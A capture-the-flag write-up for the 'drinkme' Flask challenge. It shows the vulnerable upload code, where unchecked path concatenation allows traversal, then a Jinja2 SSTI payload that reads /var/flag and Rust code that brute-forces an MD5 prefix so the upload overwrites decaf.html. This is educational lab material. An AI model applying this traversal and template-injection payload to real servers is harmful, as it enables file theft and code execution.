```text
Are you thirsty? Why don't you try some of our drinks at our new store, drinkme! Leave a message on the wall too when you're done.
NOTE: Flag is at /var/flag
NOTE: This challenge uses per-team instances. Please test locally and don't launch one until you have a working exploit.
NOTE: The drinkme instancer takes a bit of time (< 1 min) to start the container, please be patient.
https://drinkme.be.ax
```
We get all source again and I'm just including the server file for brevity. 
# app.py
```python
#!/usr/bin/env python3
from flask import Flask, flash, request, redirect, url_for, render_template, send_from_directory
import os
import hashlib
app = Flask(__name__)
app.secret_key = b'537472656c6c6963206973206d79206661766f72697465206d656d626572206f6620436f52' # Don't bother trying to exploit - this is just to get flash() to work because I'm too lazy to make proper error messages
# stuff for per-team instances, can probably ignore this line
if os.getenv('PORT') is not None:
    app.config['SERVER_NAME'] = f"{os.getenv('PORT')}.drinkme.be.ax"
@app.route('/')
@app.route('/index')
def index():
    return render_template('index.html')
@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        flash('You, uh, kinda need a file.')
        return redirect(url_for('index'))
    if 'type' not in request.form:
        flash('Please specify a filetype.')
        return redirect(url_for('index'))
    file = request.files['file']
    UPLOAD_FOLDER = './wall/' + request.form['type']
    if file.filename == '':
        flash('You uh, kinda need a file.')
        return redirect(url_for('index'))
    if file:
        filename = hashlib.md5(file.read()).hexdigest()[:5] + '.' + '.'.join(file.filename.split('.')[1:])
        file.seek(0)
        try:
            file.save(os.path.join(UPLOAD_FOLDER, filename))
            flash('File successfully uploaded!')
            return redirect(url_for('index'))
        except:
            flash('Error while uploading file.')
            return redirect(url_for('index'))
    
@app.route('/wall')
def wall():
    return render_template('guest_wall.html', images=os.listdir("wall/image"), text=os.listdir("wall/text"), videos=os.listdir("wall/video")) # Is this bad coding? Yes. Do I care? No.
@app.route('/wall/<path:path>') # I don't even use flask so this is probably implemented completely wrong pls dont flame me
def return_file(path):
    return send_from_directory("wall", path)
    
@app.route('/americano')
def beef():
    return render_template('americano.html')
@app.route('/cappuccino')
def pork():
    return render_template('cappuccino.html')
@app.route('/decaf')
def mutton():
    return render_template('decaf.html')
if __name__ == '__main__':
    app.run(host = '0.0.0.0', port = 5000, debug=True)
```
So the first thing I noticed was that it was concatenating unchecked input for the upload path and that's gross. By forging a type to include .., we can make it upload our file anywhere we want. I immediately went to "overwrite server files" and was disappointed because we don't control the filename; It's derived from the first five characters of the file md5 hash + "." + file extension. I was looking at the templates: americano.html, cappuccino.html, and *decaf.html* when it clicked. "decaf" is valid hexadecimal characters which means if we upload an html file that hashes to "decaf\*" it will upload decaf.html. I did the only reasonable thing -- make an SSTI payload to read /var/flag and then brute forced for padding which hashed to that. 
```rust
use rand::{thread_rng, Rng};
use rand::distributions::Alphanumeric;
fn main() {
    let base = "{{  self._TemplateReference__context.cycler.__init__.__globals__.__builtins__.open('/var/flag','r').read() }}";
    let (found, _) = std::iter::repeat(()).map(|_| {
        let mut attempt = base.to_string();
        for i in thread_rng().sample_iter(&Alphanumeric)
            .take(100) {
            attempt.push(i as char);
        }
        let digest = md5::compute(&attempt);
        (attempt, format!("{:x}", digest)[..5].to_string())
    }).find(|(_,x)| x == "decaf").unwrap();
    println!("{}", found);
}
```
I didn't save the flag so I'll grab it from some other writeup and update this later. 